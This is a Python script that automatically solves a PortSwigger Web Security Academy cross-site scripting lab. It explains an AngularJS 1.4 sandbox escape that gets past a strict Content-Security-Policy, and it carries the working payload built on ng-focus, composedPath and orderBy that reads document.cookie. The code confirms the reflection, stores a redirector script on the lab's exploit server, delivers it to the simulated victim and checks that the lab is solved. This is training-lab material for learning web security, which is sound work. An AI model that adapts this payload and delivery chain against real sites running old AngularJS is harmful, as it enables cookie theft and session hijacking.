#!/usr/bin/env python3
"""Automated solver: PortSwigger "Reflected XSS with AngularJS sandbox escape and CSP" (EXPERT).

Vulnerability
-------------
The blog search page reflects the ``search`` parameter unencoded inside the
``<h1>`` (``<h1>0 search results for '<input>'</h1>``).  The whole document is
compiled by AngularJS 1.4.x (``<body ng-app ng-csp>``, script loaded from
``/resources/js/angular_1-4-4.js``), so injected markup becomes an Angular
template, not just HTML.

The response is protected by::

    Content-Security-Policy: default-src 'self'; script-src 'self';
                             style-src 'unsafe-inline' 'self'

so inline ``<script>`` and inline ``on*`` handlers never run.  The vector needs
no inline script at all: an Angular directive evaluates its expression through
Angular's own compiler, which CSP does not police.

The AngularJS 1.4 sandbox blocks expression access to ``window`` and to the
``constructor`` chain, but it does not police the argument of a *filter*.  The
``orderBy`` filter is handed ``$event.composedPath()`` (an array whose last
element is ``window``) and a predicate string that is evaluated once per
element.  Assigning ``alert`` to ``z`` and calling it when the predicate hits
the ``window`` entry runs the payload in window scope, escaping the sandbox::

    <input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>

The ``#x`` fragment focuses the injected input, which fires ``ng-focus``
without any user interaction, and the alert fires with the victim's cookie.

What the solver does
--------------------
1. Fetches the lab root, confirms the page title, records the baseline status
   from the authoritative ``widgetcontainer-lab-status`` widget.
2. Control: requests the payload through ``?search=`` and asserts (a) it is
   reflected verbatim, (b) the CSP ``script-src`` still forbids inline script
   and eval, (c) the AngularJS version still carries a sandbox (< 1.6) and the
   document still bootstraps with ``ng-app``.
3. Discovers the exploit server from the lab header, reads its form field
   names, stores the redirector
   ``<script>location='<lab>/?search=<encoded payload>#x'</script>`` and
   verifies the stored body by fetching it back.
4. Delivers the exploit to the victim and polls the lab widget until it flips
   to ``is-solved`` / ``Solved``.
5. After the flip, optionally fetches the exploit server access log as
   evidence that the victim fetched the exploit, then reports request count
   and wall-clock time.

Nothing instance-specific is hardcoded: the lab URL comes from ``--url``, and
the exploit server host, its form action and its field names are discovered
from the live pages.

Usage
-----
    uv run python solve.py --url "https://<lab-id>.web-security-academy.net"
    uv run python solve.py --url "<url>" --wait 300 --verbose

Exit codes: 0 verified solved, 1 exploit sent but lab not marked solved,
2 usage/environment problem, 3 lab unreachable / expired.
"""
from __future__ import annotations

import argparse
import html as html_mod
import os
import re
import sys
import time
import urllib.parse
from datetime import datetime, timezone

import httpx

LAB_TITLE = "reflected xss with angularjs sandbox escape and csp"
PAYLOAD = "<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>"
FRAGMENT = "#x"
UA = "Mozilla/5.0 (PortSwigger AngularJS-CSP solver)"

TITLE_RE = re.compile(r"<title[^>]*>(.*?)</title>", re.S | re.I)
SOLVED_RE = re.compile(r"widgetcontainer-lab-status[^>]*\bis-solved\b", re.I)
NOT_SOLVED_RE = re.compile(r"widgetcontainer-lab-status[^>]*\bis-notsolved\b", re.I)
EXPLOIT_LINK_RE = re.compile(
    r"<a[^>]*id=['\"]?exploit-link['\"]?[^>]*href=['\"]([^'\"]+)['\"]", re.I)
ANGULAR_SRC_RE = re.compile(r"src=['\"]([^'\"]*angular[^'\"]*\.js)['\"]", re.I)
ANGULAR_VER_RE = re.compile(r"angular[_-](\d+)[-_.](\d+)[-_.](\d+)", re.I)
NG_APP_RE = re.compile(r"<body[^>]*\bng-app\b", re.I)
CSP_RE = re.compile(r"content-security-policy", re.I)
SCRIPT_SRC_RE = re.compile(r"(?:^|;)\s*script-src\s+([^;]*)", re.I)
SCRIPT_SRC_ELEM_RE = re.compile(r"(?:^|;)\s*script-src-elem\s+([^;]*)", re.I)
FORM_ACTION_RE = re.compile(r"<form[^>]*action=['\"]([^'\"]*)['\"]", re.I)
FIELD_RE = re.compile(r"<(input|textarea)\b[^>]*name=['\"]([^'\"]+)['\"][^>]*>", re.I)
HERE = os.path.dirname(os.path.abspath(__file__))


def normalize(text: str) -> str:
    return re.sub(r"[^a-z0-9]+", " ", text.lower()).strip()


def encode_payload(payload: str) -> str:
    """Percent-encode the whole payload so it survives as one query value."""
    return urllib.parse.quote(payload, safe="")


class Evidence:
    """Writes local, git-ignored artefacts (evidence/ and logs/)."""

    def __init__(self) -> None:
        self.stamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        self.root = os.path.join(HERE, "evidence")
        self.logs = os.path.join(HERE, "logs")
        for d in (self.root, self.logs):
            os.makedirs(d, exist_ok=True)
        self.events: list[str] = []

    def save(self, name: str, text: str) -> str:
        path = os.path.join(self.root, f"{self.stamp}-{name}")
        with open(path, "w", encoding="utf-8") as f:
            f.write(text)
        return path

    def log(self, line: str) -> None:
        self.events.append(f"{datetime.now(timezone.utc).isoformat(timespec='seconds')} {line}")

    def flush(self) -> str:
        path = os.path.join(self.logs, f"{self.stamp}-solve.log")
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(self.events) + "\n")
        return path


class Solver:
    def __init__(self, url: str, *, timeout: float, wait: float,
                 verbose: bool, skip_access_log: bool) -> None:
        self.base = url.rstrip("/")
        self.host = urllib.parse.urlsplit(self.base).netloc
        self.timeout = timeout
        self.wait = wait
        self.verbose = verbose
        self.skip_access_log = skip_access_log
        self.requests = 0
        self.t0 = time.time()
        self.ev = Evidence()
        self.client = httpx.Client(
            timeout=timeout,
            follow_redirects=True,
            headers={"User-Agent": UA},
        )
        # fields filled by identify()
        self.csp = ""
        self.angular_src = ""
        self.angular_version = ""
        self.exploit_server = ""

    # -- plumbing ---------------------------------------------------------- #
    def _count(self, method: str, url: str, status: int) -> None:
        self.requests += 1
        if self.verbose:
            print(f"    {method} {url} -> {status}", flush=True)
        self.ev.log(f"{method} {url} -> {status}")

    def get(self, url: str, params=None) -> httpx.Response:
        r = self.client.get(url, params=params)
        self._count("GET", str(r.url), r.status_code)
        return r

    def post(self, url: str, data) -> httpx.Response:
        r = self.client.post(url, data=data)
        self._count("POST", str(r.url), r.status_code)
        return r

    def log(self, msg: str) -> None:
        line = f"[{time.time() - self.t0:6.1f}s] {msg}"
        print(line, flush=True)
        self.ev.log(msg)

    # -- state ------------------------------------------------------------- #
    @staticmethod
    def is_solved(html: str) -> bool:
        """Authoritative oracle: the lab header status widget."""
        return bool(SOLVED_RE.search(html)) and "<p>Solved</p>" in html

    @staticmethod
    def script_sources(csp: str) -> str:
        for rx in (SCRIPT_SRC_ELEM_RE, SCRIPT_SRC_RE):
            m = rx.search(csp)
            if m:
                return m.group(1).strip()
        return ""

    # -- phases ------------------------------------------------------------ #
    def identify(self) -> None:
        r = self.get(self.base + "/")
        if r.status_code != 200:
            raise SystemExit(f"error: lab root returned HTTP {r.status_code}")
        m = TITLE_RE.search(r.text)
        title = re.sub(r"\s+", " ", html_mod.unescape(m.group(1))).strip() if m else ""
        self.log(f"lab title       : {title!r} (HTTP {r.status_code})")
        if normalize(LAB_TITLE) not in normalize(title):
            raise SystemExit(
                f"error: this is not the expected lab ({LAB_TITLE!r}): {title!r}")

        self.csp = r.headers.get("content-security-policy", "")
        m = ANGULAR_SRC_RE.search(r.text)
        self.angular_src = m.group(1) if m else ""
        mv = ANGULAR_VER_RE.search(self.angular_src or r.text)
        if mv:
            self.angular_version = ".".join(mv.groups())
        self.log(f"angularjs       : {self.angular_src or '(not found)'} "
                 f"version={self.angular_version or '?'} "
                 f"ng-app={'yes' if NG_APP_RE.search(r.text) else 'NO'}")
        self.log(f"CSP             : {self.csp or '(none)'}")
        if not self.angular_src or not mv:
            raise SystemExit("error: AngularJS bundle not found on the lab page")
        if not NG_APP_RE.search(r.text):
            raise SystemExit("error: <body ng-app> missing, template injection cannot run")
        major, minor = int(mv.group(1)), int(mv.group(2))
        if (major, minor) >= (1, 6):
            raise SystemExit(
                f"error: AngularJS {self.angular_version} has no sandbox, "
                "this vector targets the 1.4.x sandbox")
        if "ng-csp" not in r.text:
            print("    note: ng-csp attribute not seen on <body>", flush=True)

        link = EXPLOIT_LINK_RE.search(r.text)
        self.exploit_server = (link.group(1).rstrip("/") if link
                               else "")
        self.log(f"exploit server  : {self.exploit_server or '(not advertised)'}")

    def baseline(self) -> tuple[bool, str]:
        r = self.get(self.base + "/")
        solved = self.is_solved(r.text)
        state = "SOLVED (already)" if solved else "not solved"
        if not solved and NOT_SOLVED_RE.search(r.text) is None:
            print("    warning: no recognisable status widget in the page", flush=True)
        self.log(f"baseline status : {state}")
        path = self.ev.save("lab-baseline.html", r.text)
        self.log(f"evidence        : {os.path.relpath(path, HERE)}")
        return solved, r.text

    def control(self) -> None:
        """Prove the sink and the filter state before delivering anything."""
        r = self.get(self.base + "/", params={"search": PAYLOAD})
        script_src = self.script_sources(self.csp or r.headers.get(
            "content-security-policy", ""))
        reflected = PAYLOAD in r.text or PAYLOAD.replace("<", "&lt;") in r.text
        h1 = re.search(r"<h1>(.*?)</h1>", r.text, re.S)
        header = re.sub(r"\s+", " ", h1.group(1)).strip() if h1 else "(no <h1>)"
        self.log(f"reflection      : raw={'yes' if PAYLOAD in r.text else 'no'} "
                 f"h1={header[:90]!r}")
        if not reflected:
            raise SystemExit("error: the search parameter is not reflected, "
                             "the sink has changed")
        weak = [w for w in ("unsafe-inline", "unsafe-eval", "*")
                if w in script_src.lower()]
        self.log(f"script-src      : {script_src!r} "
                 f"(inline script: {'ALLOWED by ' + ','.join(weak) if weak else 'blocked'})")
        if weak:
            print("    note: CSP does not block inline script here, "
                  "the Angular template path is still what the solver uses", flush=True)
        path = self.ev.save("control-reflection.html", r.text)
        self.log(f"evidence        : {os.path.relpath(path, HERE)}")

    # -- exploit server ---------------------------------------------------- #
    def discover_exploit_form(self) -> tuple[str, dict, set[str]]:
        if not self.exploit_server:
            raise SystemExit("error: no exploit server advertised in the lab header "
                             "(already-solved instances hide it)")
        r = self.get(self.exploit_server + "/")
        if r.status_code != 200:
            raise SystemExit(f"error: exploit server returned HTTP {r.status_code}")
        if 'name="responseBody"' not in r.text:
            raise SystemExit("error: exploit-server form not found at its root")
        fields = {name for _, name in FIELD_RE.findall(r.text)}
        m = FORM_ACTION_RE.search(r.text)
        action = (m.group(1) if m else "") or "/"
        defaults = {
            "responseFile": "/exploit",
            "responseHead": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8",
        }
        for name in ("responseFile", "responseHead", "responseBody"):
            if name not in fields:
                raise SystemExit(f"error: exploit form has no {name!r} field")
        self.log(f"exploit form    : action={action!r} fields={sorted(fields)}")
        return urllib.parse.urljoin(self.exploit_server + "/", action), defaults, fields

    def build_body(self) -> str:
        url = f"{self.base}/?search={encode_payload(PAYLOAD)}{FRAGMENT}"
        body = f"<script>location='{url}';</script>"
        self.log(f"exploit url     : {url[:120]}{'...' if len(url) > 120 else ''}")
        return body

    def store(self, action: str, defaults: dict, body: str) -> None:
        data = {
            "urlIsHttps": "on",
            "responseFile": defaults["responseFile"],
            "responseHead": defaults["responseHead"],
            "responseBody": body,
            "formAction": "STORE",
        }
        r = self.post(action, data)
        if r.status_code >= 400:
            raise SystemExit(f"error: exploit store failed HTTP {r.status_code}")
        stored = self.get(self.exploit_server + defaults["responseFile"])
        if body not in stored.text:
            print("    stored body snippet:",
                  re.sub(r"\s+", " ", stored.text[:200]), flush=True)
            raise SystemExit("error: the exploit body was not stored as written")
        self.log(f"store           : verified at "
                 f"{self.exploit_server}{defaults['responseFile']} "
                 f"(HTTP {stored.status_code})")
        self.ev.save("exploit-server-response.html", stored.text)
        self.ev.save("exploit-body.txt", body)

    def deliver(self, action: str, defaults: dict, body: str) -> None:
        data = {
            "urlIsHttps": "on",
            "responseFile": defaults["responseFile"],
            "responseHead": defaults["responseHead"],
            "responseBody": body,
            "formAction": "DELIVER_TO_VICTIM",
        }
        r = self.post(action, data)
        self.log(f"deliver         : HTTP {r.status_code} (victim queued)")
        if r.status_code >= 400:
            raise SystemExit(f"error: delivery failed HTTP {r.status_code}")

    # -- verification ------------------------------------------------------ #
    def wait_solved(self) -> tuple[bool, str]:
        deadline = time.time() + self.wait
        last = ""
        while True:
            r = self.get(self.base + "/")
            last = r.text
            if self.is_solved(last):
                path = self.ev.save("lab-solved.html", last)
                self.log(f"evidence        : {os.path.relpath(path, HERE)}")
                return True, last
            if time.time() >= deadline:
                return False, last
            time.sleep(2.0)

    def access_log(self, action: str, defaults: dict, body: str) -> None:
        if self.skip_access_log:
            return
        data = {
            "urlIsHttps": "on",
            "responseFile": defaults["responseFile"],
            "responseHead": defaults["responseHead"],
            "responseBody": body,   # ACCESS_LOG re-stores: keep the same body
            "formAction": "ACCESS_LOG",
        }
        try:
            r = self.post(action, data)
        except httpx.HTTPError as e:
            print(f"    note: access log unavailable: {e}", flush=True)
            return
        text = html_mod.unescape(r.text)
        lines = [ln.strip() for ln in re.findall(r"<pre[^>]*>(.*?)</pre>", r.text, re.S)]
        joined = "\n".join(lines) or text
        hits = [ln for ln in joined.splitlines()
                if self.host in ln or "/exploit" in ln or "search=" in ln]
        path = self.ev.save("access-log.html", r.text)
        with open(os.path.join(self.ev.root, f"{self.ev.stamp}-access-log-summary.txt"),
                  "w", encoding="utf-8") as f:
            f.write("\n".join(hits) or joined[:2000])
        self.log(f"access log      : {len(hits)} relevant line(s), "
                 f"evidence {os.path.relpath(path, HERE)}")
        for ln in hits[:6]:
            print(f"    {ln[:150]}", flush=True)

    # -- driver ------------------------------------------------------------ #
    def run(self) -> int:
        self.identify()
        already, _ = self.baseline()
        if already:
            print()
            print("=" * 70)
            print("lab status      : SOLVED (already, before this run)")
            print("caused by solver: no (was already solved)")
            print(f"HTTP requests   : {self.requests}")
            print(f"elapsed         : {time.time() - self.t0:.1f}s")
            print("=" * 70)
            print("note: the lab header hides the exploit server once solved, so no")
            print("      delivery was attempted. Re-prove the mechanism on a fresh")
            print("      instance launched from the Academy account if needed.")
            return 0

        self.control()
        action, defaults, _fields = self.discover_exploit_form()
        body = self.build_body()
        self.store(action, defaults, body)
        self.deliver(action, defaults, body)
        solved, final = self.wait_solved()
        if solved:
            self.access_log(action, defaults, body)
        else:
            self.ev.save("lab-not-solved.html", final)
        elapsed = time.time() - self.t0

        print()
        print("=" * 70)
        state = "SOLVED" if solved else f"NOT SOLVED (after {self.wait:.0f}s poll)"
        print(f"lab status      : {state}")
        print(f"caused by solver: {'yes' if solved else 'n/a'}")
        print(f"HTTP requests   : {self.requests}")
        print(f"elapsed         : {elapsed:.1f}s")
        print("=" * 70)
        if solved:
            print("evidence        : lab header widget reports is-solved / 'Solved';")
            print("                  injection point, stored exploit, delivery and the")
            print("                  post-solve page are saved under evidence/ and logs/.")
            print(f"log             : {os.path.relpath(self.ev.flush(), HERE)}")
            return 0
        print("error: the lab did not report solved state; artefacts kept under evidence/.")
        print(f"log             : {os.path.relpath(self.ev.flush(), HERE)}")
        return 1


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Solve the PortSwigger 'Reflected XSS with AngularJS sandbox "
                    "escape and CSP' lab (EXPERT).")
    ap.add_argument("--url", required=True, help="Lab base URL")
    ap.add_argument("--timeout", type=float, default=25.0,
                    help="Per-request timeout in seconds (default 25)")
    ap.add_argument("--wait", type=float, default=300.0,
                    help="Seconds to poll for solved state after delivery (default 300)")
    ap.add_argument("--verbose", action="store_true", help="Log every request URL")
    ap.add_argument("--skip-access-log", action="store_true",
                    help="Do not fetch the exploit server access log after solving")
    args = ap.parse_args()

    if not re.match(r"^https?://[^/\s]+", args.url):
        print(f"error: --url must be an http(s) lab URL, got {args.url!r}", file=sys.stderr)
        return 2

    solver = Solver(args.url, timeout=args.timeout, wait=args.wait,
                    verbose=args.verbose, skip_access_log=args.skip_access_log)
    try:
        return solver.run()
    except httpx.HTTPError as e:
        print(f"error: lab unreachable/expired: {e}", file=sys.stderr)
        return 3
    except KeyboardInterrupt:
        print("interrupted", file=sys.stderr)
        return 130
    finally:
        solver.client.close()


if __name__ == "__main__":
    sys.exit(main())
